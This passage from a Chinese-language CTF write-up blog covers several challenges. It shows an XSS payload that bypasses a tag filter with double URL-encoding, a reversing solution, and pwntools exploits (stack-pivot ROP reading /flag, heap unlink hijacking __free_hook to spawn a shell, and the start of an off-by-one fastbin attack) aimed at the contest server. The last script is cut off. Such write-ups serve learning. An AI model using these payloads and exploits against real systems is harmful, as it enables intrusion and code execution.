<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>exp中写了，js代码要经过两次url编码，这是因为注入需要发送get请求，url需要编码一次，注入到页面后，script的src属性是个url，这里也得编码一次。</p>
<p>其实get请求的url的参数是</p>
<p><code>?message=&lt;scripscriptt src=&#39;our_url&#39;&gt;&lt;/scrscriptipt&gt;</code></p>
<p>然后，这个<code>our_url</code>是：</p>
<p><code>/send?message=一次url编码后的js</code>，然后上面那个url的<code>mesage=</code>后面的东西得再url编码一次</p>
<p>所以最后就是</p>
<p><code>?message=&lt;sscriptcript+src%3d&#39;send%3fmessage%3d&#123;你的js代码两次url编码后&#125;&#39;&lt;/sscriptcript&gt;</code></p>
<hr>
<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="oooollvm"><a href="#oooollvm" class="headerlink" title="oooollvm"></a>oooollvm</h3><p>这题加了混淆，首先找到输入点：</p>
<p><img src="/images/e1de0fb/re-1-1.png" alt="1"></p>
<p>根据这个str看看都在哪里有用到，发现除了strlen就这一处：</p>
<p><img src="/images/e1de0fb/re-1-2.png" alt="2"></p>
<p>检验失败，程序退出的地方有多个，基本都是下面的形式：</p>
<p><img src="/images/e1de0fb/re-1-3.png" alt="3"></p>
<p>将所有出口打上断点，进行调试。</p>
<p>经过多次调试，这个pos变量是从0一直加1来递增的，而且也发现str的长度是34。</p>
<p>每当<code>result</code>的结果为true的时候，也就是<code>table2[pos]!=(~str[pos] &amp; (pos + table1[pos]) | ~(pos + table1[pos]) &amp; str[pos])</code>的时候，都会跳到失败退出的断点处。</p>
<p>证明关键就是要使得result为false,也就是这个表达式为true:</p>
<p><code>table2[pos] == (~str[pos] &amp; (pos + table1[pos]) | ~(pos + table1[pos]) &amp; str[pos])</code></p>
<p>那好办，找到table2和table1的数据，然后根据位运算反推str即可：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python3</span>

<span class="token comment"># table2[pos] == (~str[pos] &amp; (pos + table1[pos]) | ~(pos + table1[pos]) &amp; str[pos])</span>
<span class="token comment"># por in range(34)</span>


table2 <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token number">0xE3</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0xA4</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0xCA</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x29</span><span class="token punctuation">,</span> <span class="token number">0xAE</span><span class="token punctuation">,</span> <span class="token number">0x9D</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> 
    <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0x6C</span><span class="token punctuation">,</span> <span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0x4B</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0xC5</span><span class="token punctuation">,</span> 
    <span class="token number">0x4F</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">,</span> <span class="token number">0xA9</span><span class="token punctuation">,</span> <span class="token number">0xDC</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0x8E</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> 
    <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x1C</span>
<span class="token punctuation">]</span>
table1 <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0xC3</span><span class="token punctuation">,</span> <span class="token number">0x6A</span><span class="token punctuation">,</span> <span class="token number">0xAB</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0xC9</span><span class="token punctuation">,</span> <span class="token number">0x5F</span><span class="token punctuation">,</span> 
    <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0x0B</span><span class="token punctuation">,</span> <span class="token number">0x29</span><span class="token punctuation">,</span> <span class="token number">0x4B</span><span class="token punctuation">,</span> <span class="token number">0x4B</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">,</span> <span class="token number">0x96</span><span class="token punctuation">,</span> 
    <span class="token number">0x16</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x6E</span><span class="token punctuation">,</span> <span class="token number">0x87</span><span class="token punctuation">,</span> <span class="token number">0xA8</span><span class="token punctuation">,</span> <span class="token number">0x98</span><span class="token punctuation">,</span> <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> 
    <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x5F</span><span class="token punctuation">,</span> <span class="token number">0xCE</span><span class="token punctuation">,</span> <span class="token number">0x40</span>
<span class="token punctuation">]</span>

flag <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> pos <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">34</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    mask <span class="token operator">=</span> pos <span class="token operator">+</span> table1<span class="token punctuation">[</span>pos<span class="token punctuation">]</span>
    dest <span class="token operator">=</span> table2<span class="token punctuation">[</span>pos<span class="token punctuation">]</span>
    ch <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span>dest <span class="token operator">&amp;</span> mask<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> mask<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>dest <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token operator">~</span>mask<span class="token punctuation">)</span><span class="token punctuation">)</span>
    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="ROP-LEVEL2"><a href="#ROP-LEVEL2" class="headerlink" title="ROP_LEVEL2"></a>ROP_LEVEL2</h3><p>这题必须详细记录下。</p>
<p>这里明显就有溢出的漏洞：</p>
<p><img src="/images/e1de0fb/pwn-1-1.png" alt="1"></p>
<p>读入0x60个字节，而局部变量buf到局部变量fd之间隔了0x48个字节，fd数组占8个字节，也就是一共0x50个字节。可以溢出0x10个字节，其中一个是函数开头push的rbp，之后就是返回地址。</p>
<p>虽然可以溢出到返回地址，但不足以构造ROP。这时可以想办法把rsp指向我们可以控制的区域（后来发现这种技术叫做栈迁移），可以看到，一开始还有一个<code>read(0, &amp;::buf, 0x100uLL)</code>，这个<code>&amp;::buf</code>是全局变量，在bss段：</p>
<p><img src="/images/e1de0fb/pwn-1-3.png" alt="3"></p>
<p>而且程序并没有开PIE保护：</p>
<p><img src="/images/e1de0fb/pwn-1-5.png" alt="5"></p>
<p>也就是说，这个bss的地址是固定的，而且内容可控，我们可以把栈迁移到这里，在这里构造ROP</p>
<p>那么返回地址要返回到可以修改rsp指令的地方，并且修改完后，还能再ret一次，跳到构造好的ROP里。</p>
<p>值得注意的是，指令<code>leave</code>，这个指令其实包含了一下工作：</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">mov rsp,rbp
pop rbp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>那么问题就变成了，如何修改rbp了。这不？第二项工作就是修改rbp了。</p>
<p>而且main函数调用之后刚好就有两指令<code>leave</code>和<code>ret</code></p>
<p><img src="/images/e1de0fb/pwn-1-2.png" alt="2"></p>
<p>前面说了，可溢出0x10个字节，8字节是函数开头push的rbp，这8字节会在<code>leave</code>指令的第二项工作<code>pop rbp</code>中回到rbp中，所以，首先我们要控制这8个字节成全局变量buf的地址，然后返回地址构造成0x4009d5，也就是返回到<code>leave</code>这条指令的位置，之后就成功迁移栈了，我们只需在全局变量buf地址处构造ROP即可。</p>
<p>构造ROP，跳到<code>0x400985</code>处</p>
<p><img src="/images/e1de0fb/pwn-1-3.png" alt="3"></p>
<p>后面就是，打开文件-&gt;读取内容-&gt;输出内容了，我们只要把在这之前先把参数设置成打开<code>/flag</code>文件，也就是使edi为字符串<code>&quot;/flag&quot;</code>的地址，这个字符串我们一样放到bss段里，之后就把flag给读出来了。</p>
<p>但要注意的是：</p>
<p><img src="/images/e1de0fb/pwn-1-7.png" alt="7"></p>
<p><img src="/images/e1de0fb/pwn-1-6.png" alt="6"></p>
<p>局部变量buf的位置是<code>rbp-0x50</code>，文件被读入到这里，这个地址必须可以访问，我们同样可以控制其在bss段内，放到ROP后面即可，我的ROP占用了0x40个字节（8字节对齐后），那么这个<code>rbp</code>就要设置成<code>全局变量buf+0x90</code>以上才够，否则读入flag的时候，不然就把ROP给破坏了（文件名”/flag”字符串在ROP最后面，之前就是因为把这个文件名破坏了，没getshell)</p>
<p>大概过程如下图：</p>
<p><img src="/images/e1de0fb/pwn-1-8.png" alt="8"></p>
<p>exp如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python2</span>
<span class="token comment">#coding=utf8</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment">#from LibcSearcher import LibcSearcher</span>
<span class="token comment">#from time import sleep</span>

context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span> <span class="token string">"splitw"</span><span class="token punctuation">,</span> <span class="token string">"-h"</span><span class="token punctuation">]</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./ROP'</span><span class="token punctuation">)</span>
<span class="token comment">#io = elf.process()</span>
io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.103.214.163'</span><span class="token punctuation">,</span> <span class="token number">20300</span><span class="token punctuation">)</span>

final_addr <span class="token operator">=</span> <span class="token number">0x400985</span>  <span class="token comment"># open之后一把梭</span>
pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x400a43</span>
pop_rsi_r15_ret <span class="token operator">=</span> <span class="token number">0x400a41</span>
leave_ret <span class="token operator">=</span> <span class="token number">0x4009D5</span>
buf_addr<span class="token operator">=</span> <span class="token number">0x06010A0</span>

<span class="token comment"># ROP</span>
payload_1 <span class="token operator">=</span> p64<span class="token punctuation">(</span>buf_addr<span class="token operator">+</span><span class="token number">0x90</span><span class="token punctuation">)</span> <span class="token comment"># rbp   rbp-0x50是读入数据的地方，要留够空间</span>
payload_1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>buf_addr<span class="token operator">+</span><span class="token number">0x38</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_r15_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment"># 传参</span>
payload_1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>final_addr<span class="token punctuation">)</span>
payload_1 <span class="token operator">+=</span> <span class="token string">'/flag\x00'</span>  <span class="token comment"># buf_addr+0x38</span>

io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'so?\n'</span><span class="token punctuation">,</span> payload_1<span class="token punctuation">)</span>

<span class="token comment"># 迁移栈的payload</span>
payload_2 <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x50</span>  <span class="token comment"># padding</span>
payload_2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>buf_addr<span class="token punctuation">)</span> <span class="token comment"># rbp</span>
payload_2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span> <span class="token comment"># 使得栈迁移到buf上</span>

io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload_2<span class="token punctuation">)</span>

<span class="token keyword">print</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h3 id="Annevi-Note"><a href="#Annevi-Note" class="headerlink" title="Annevi_Note"></a>Annevi_Note</h3><p>堆溢出，漏洞点在edit函数：</p>
<p><img src="/images/e1de0fb/pwn-2-1.png" alt="1"></p>
<p>无论堆的大小是多少都可读入256字节。主要漏洞是可以溢出修改下一个chunk的字段。</p>
<p>可以利用unlink，具体可以参考文章<a href="https://www.jianshu.com/p/2776b6a79a11">https://www.jianshu.com/p/2776b6a79a11</a>（这个是讲32位平台的），还有<a href="https://www.jianshu.com/p/1f4b054d6bfc">https://www.jianshu.com/p/1f4b054d6bfc</a>（这个讲64位平台的，不过不具体）</p>
<p>利用unlink，把system函数的地址放到<code>__free_hook</code>里，然后释放一块内存即可getshell，内存中放着字符串<code>/bin/sh</code></p>
<p>具体可以看看exp和里面的注释：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python2</span>
<span class="token comment">#coding=utf8</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> LibcSearcher

context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span> <span class="token string">"splitw"</span><span class="token punctuation">,</span> <span class="token string">"-h"</span><span class="token punctuation">]</span>


<span class="token comment">#io = process(['./Annevi'])#, env=&#123;'LD_PRELOAD': './libc-2.23.so'&#125;)</span>
io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.103.214.163'</span><span class="token punctuation">,</span> <span class="token number">20301</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./Annevi'</span><span class="token punctuation">)</span>
<span class="token comment">#io = elf.process()</span>
<span class="token comment">#libc = ELF('./libc-2.23.so')</span>


<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'\n:'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'size?\n'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'\n:'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index?\n'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'\n:'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index?\n'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'\n:'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index?\n'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>


<span class="token comment"># list数组在bss段，且PIE没开</span>
list_addr <span class="token operator">=</span> <span class="token number">0x602040</span>

<span class="token comment"># 分配空间要0x90及以上</span>
add<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span> <span class="token comment"># 0</span>
add<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span> <span class="token comment"># 1</span>
add<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span> <span class="token comment"># 2</span>

<span class="token comment"># 伪造chunk</span>
payload_1 <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment"># prev_size</span>
payload_1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span> <span class="token comment"># size</span>
payload_1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>list_addr <span class="token operator">-</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token comment"># fd 64位平台下chunk头部的几个字段都是8字节大小</span>
payload_1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>list_addr <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token comment"># bk</span>
payload_1 <span class="token operator">+=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x90</span> <span class="token operator">-</span> <span class="token number">0x20</span><span class="token punctuation">)</span>  <span class="token comment"># padding</span>
payload_1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span>  <span class="token comment">#1的prev_size 这样free的时候寻找上一个chunk会找到我伪造的那个</span>
payload_1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">)</span>  <span class="token comment">#1的size，并把前一个chunk标记为free(size最低位置为零)</span>
edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> payload_1<span class="token punctuation">)</span>

dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment"># 由于unlink，此时list[0] = list - 0x18，list[0]即#0</span>

<span class="token comment"># leak libc</span>
edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>list_addr <span class="token operator">-</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 将list[1]指向got表的puts</span>
show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">)</span>
puts_addr <span class="token operator">=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span>
puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span>
libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span> puts_addr<span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>
system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>
malloc_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">)</span>
free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'__free_hook'</span><span class="token punctuation">)</span>


<span class="token keyword">print</span> <span class="token string">'libc_base='</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token string">'system_addr='</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token string">'malloc_hook='</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token string">'free_hook='</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span>

<span class="token comment"># 劫持free_hook</span>
edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># pwn</span>
add<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span> <span class="token comment"># 3</span>
dele<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h3 id="E99p1ant-Note"><a href="#E99p1ant-Note" class="headerlink" title="E99p1ant_Note"></a>E99p1ant_Note</h3><p>这题其实和上一题类似，也是溢出，只不过只能溢出1个字节，称为<code>off by one</code>？</p>
<p><img src="/images/e1de0fb/pwn-3-1.png" alt="1"></p>
<p>其实溢出1个字节也够了，能够修改size字段就好，结合unsorted bin泄露libc基址，然后extend chunk加fastbin attack，把onegadget写入<code>__malloc_hook</code>区域就好</p>
<p>可参考文章：<a href="https://blog.csdn.net/Breeze_CAT/article/details/103788698">https://blog.csdn.net/Breeze_CAT/article/details/103788698</a></p>
<p>但是onegadget都是有条件的（题目说libc是libc-2.23，自己下一个就好）</p>
<p><img src="/images/e1de0fb/pwn-3-2.png" alt="2"></p>
<p>第1个的条件不好控，2，3，4都是要求栈上某处为NULL，经过检验发现直接讲onegadget写入<code>__malloc_hook</code>，都不能满足条件（出题人说第4个可以，也许我的栈风水不好？）</p>
<p>那么就需要控制rsp来使得满足条件了，找了一大堆资料后，发现可以在<code>__malloc_hook</code>的时候，先跳到realloc函数开头某处，此函数开头好多<code>push</code>指令，可以修改rsp，而且realloc函数还会调用<code>__realloc_hook</code>区域里填的函数地址，就像malloc调用<code>__malloc_hook</code>里的函数地址一样。那么只要把onegadget填入<code>__realloc_hook</code>即可。</p>
<p>关于__realloc_hook的利用可以参考文章：<a href="https://www.xd10086.com/posts/8016150119358581687/">https://www.xd10086.com/posts/8016150119358581687/</a></p>
<p>exp如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python2</span>
<span class="token comment">#coding=utf8</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> LibcSearcher

context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span> <span class="token string">"splitw"</span><span class="token punctuation">,</span> <span class="token string">"-h"</span><span class="token punctuation">]</span>

<span class="token comment">#io = process(['./E99'], env=&#123;'LD_PRELOAD': './libc6_2.23-0ubuntu10_amd64.so'&#125;)</span>
io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.103.214.163'</span><span class="token punctuation">,</span> <span class="token number">20302</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./E99'</span><span class="token punctuation">)</span>
<span class="token comment">#libc = ELF('./libc-2.23.so.release')</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc6_2.23-0ubuntu10_amd64.so'</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'\n:'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'size?\n'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
